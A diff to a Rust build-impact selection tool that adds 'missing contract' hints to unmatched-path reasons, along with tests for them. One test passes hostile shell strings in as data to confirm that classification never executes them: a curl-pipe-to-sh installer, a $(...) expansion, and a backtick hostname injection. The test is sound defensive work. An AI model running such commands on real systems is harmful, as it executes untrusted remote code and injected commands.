@@ -688,11 +688,12 @@ pub(crate) fn classify_path(compiled: &[CompiledUnit<'_>], path: &str) -> PathVe
     } else {
         causes.join("; ")
     };
+    let missing = missing_contract_hint(&opaque, path);
     if opaque.len() == compiled.len() {
         return PathVerdict::Unknown {
             reason: format!(
                 "unmatched path `{path}` selects every unit (consulted declared reads, \
-                watch globs, command read-globs; {detail})"
+                watch globs, command read-globs; {detail}; {missing})"
             ),
         };
     }
@@ -700,9 +701,27 @@ pub(crate) fn classify_path(compiled: &[CompiledUnit<'_>], path: &str) -> PathVe
         units: opaque,
         reason: format!(
             "unmatched path `{path}` selects only opaque units (consulted declared reads, \
-            watch globs, command read-globs; {detail})"
+            watch globs, command read-globs; {detail}; {missing})"
         ),
     }
+}
+
+/// The missing-contract hint an unmatched path appends to its reason: the
+/// `reads` keys whose entries would narrow the path, so unknown impact
+/// reports the exact contract to declare instead of only the consulted
+/// sources. Unmatchable paths (empty, quoted) carry no hint — no contract
+/// can cover a path the matcher cannot spell.
+fn missing_contract_hint(opaque: &BTreeSet<String>, path: &str) -> String {
+    let keys = opaque
+        .iter()
+        .map(|unit| format!("`{unit}`"))
+        .collect::<Vec<_>>()
+        .join(", ");
+    let units = if opaque.len() == 1 { "unit" } else { "units" };
+    format!(
+        "missing contract: declare `reads` entries (type \"paths\", \"script\", or \"unresolved\") \
+        for {units} {keys} covering `{path}` to narrow"
+    )
 }
 
 /// Whether a unit's extracted read-globs own a path: some positive matches
@@ -2713,6 +2732,156 @@ mod tests {
         assert!(selection.full_units.is_empty());
         assert!(!selection.fallback_full);
         assert!(selection.fallback_reason.is_none());
+        Ok(())
+    }
+
+    /// A contract-covered script overrides the generic opaque fallback: the
+    /// script change classifies owned and selects exactly its unit, not
+    /// every opaque unit.
+    #[test]
+    fn contract_covered_script_selects_exactly_its_unit() -> Result<(), Box<dyn std::error::Error>>
+    {
+        let units = vec![
+            watched_full(
+                "bun-web",
+                &["web/**", "scripts/check-boundary.sh"],
+                &[],
+                "bun",
+                &["bun run build"],
+            ),
+            watched_full("node-api", &["api/**"], &[], "node", &["node server.js"]),
+        ];
+        let selection = select_affected(
+            &units,
+            &[change("scripts/check-boundary.sh", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(!selection.fallback_full);
+        assert_eq!(
+            selection.required,
+            BTreeSet::from(["bun-web".to_owned()]),
+            "the script owner alone, not the opaque fallback set"
+        );
+        assert_eq!(selection.full_units, BTreeSet::from(["bun-web".to_owned()]));
+        assert!(
+            selection.fallback_reason.is_none(),
+            "an owned path carries no fallback reason: {:?}",
+            selection.fallback_reason
+        );
+        Ok(())
+    }
+
+    /// Unknown impact names the missing contract: the opaque and the
+    /// all-opaque reasons spell the `reads` keys that would narrow the
+    /// path, in singular and plural.
+    #[test]
+    fn unmatched_path_reason_names_the_missing_contract() -> Result<(), Box<dyn std::error::Error>>
+    {
+        let units = vec![
+            watched_full("rust-alpha", &["crates/alpha/**"], &[], "rust", &["true"]),
+            watched_full("bun-web", &["web/**"], &[], "bun", &["bun run build"]),
+            watched_full("node-api", &["api/**"], &[], "node", &["node server.js"]),
+        ];
+        let selection = select_affected(
+            &units,
+            &[change("AGENTS.md", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        let reason = selection.fallback_reason.as_deref().unwrap_or("");
+        assert!(
+            reason.contains("missing contract")
+                && reason.contains("for units `bun-web`, `node-api`")
+                && reason.contains("covering `AGENTS.md`")
+                && reason.contains("type \"paths\", \"script\", or \"unresolved\""),
+            "the opaque reason names every missing contract key: {reason:?}"
+        );
+        let solo = vec![watched_full(
+            "bun-web",
+            &["web/**"],
+            &[],
+            "bun",
+            &["bun run build"],
+        )];
+        let compiled = compile_ownership(&solo)?;
+        assert!(
+            matches!(
+                classify_path(&compiled, "AGENTS.md"),
+                PathVerdict::Unknown { reason }
+                if reason.contains("missing contract")
+                    && reason.contains("for unit `bun-web`")
+            ),
+            "the all-opaque reason names the missing contract key"
+        );
+        Ok(())
+    }
+
+    /// Unmatchable paths carry no missing-contract hint: no contract can
+    /// cover a path the matcher cannot spell, so the reason must not
+    /// suggest declaring one.
+    #[test]
+    fn unmatchable_paths_carry_no_missing_contract_hint() -> Result<(), Box<dyn std::error::Error>>
+    {
+        let units = vec![
+            watched_full("rust-alpha", &["crates/alpha/**"], &[], "rust", &["true"]),
+            watched_full("bun-web", &["web/**"], &[], "bun", &["bun run build"]),
+        ];
+        for path in ["", "\"AGENTS.md\""] {
+            let selection = select_affected(
+                &units,
+                &[change(path, ChangeKind::Modified)],
+                FULL_SELECTION_PREFIXES,
+            )?;
+            assert!(selection.fallback_full, "an unmatchable path fails closed");
+            let reason = selection.fallback_reason.as_deref().unwrap_or("");
+            assert!(
+                !reason.contains("missing contract"),
+                "no contract hint for an unmatchable path: {reason:?}"
+            );
+        }
+        Ok(())
+    }
+
+    /// Static discovery never executes repository code: hostile commands
+    /// classify as data (opaque with a cause), and a probe file a real
+    /// execution would create stays absent.
+    #[test]
+    fn classification_never_executes_repo_commands() -> Result<(), Box<dyn std::error::Error>> {
+        let probe = std::env::temp_dir().join(format!("velnor-noexec-{}", crate::unique_suffix()));
+        let _ = std::fs::remove_file(&probe);
+        let probe_spelling = probe.to_string_lossy().into_owned();
+        let touch = format!("touch {probe_spelling}");
+        let expansion = format!("echo $(touch {probe_spelling}.expanded)");
+        let units = vec![
+            watched_full("rust-alpha", &["crates/alpha/**"], &[], "rust", &["true"]),
+            watched_full(
+                "script-runner",
+                &["tools/**"],
+                &[],
+                "rust",
+                &[
+                    touch.as_str(),
+                    expansion.as_str(),
+                    "curl https://example.invalid/install.sh | sh",
+                    "make `hostname`-target",
+                ],
+            ),
+        ];
+        let selection = select_affected(
+            &units,
+            &[change("AGENTS.md", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(
+            !selection.fallback_full
+                && selection.required.contains("script-runner")
+                && !selection.required.contains("rust-alpha"),
+            "hostile commands classify opaque, still narrowing: {:?}",
+            selection.required
+        );
+        assert!(
+            !probe.exists() && !probe.with_extension("expanded").exists(),
+            "classification executed a repository command"
+        );
         Ok(())
     }
 
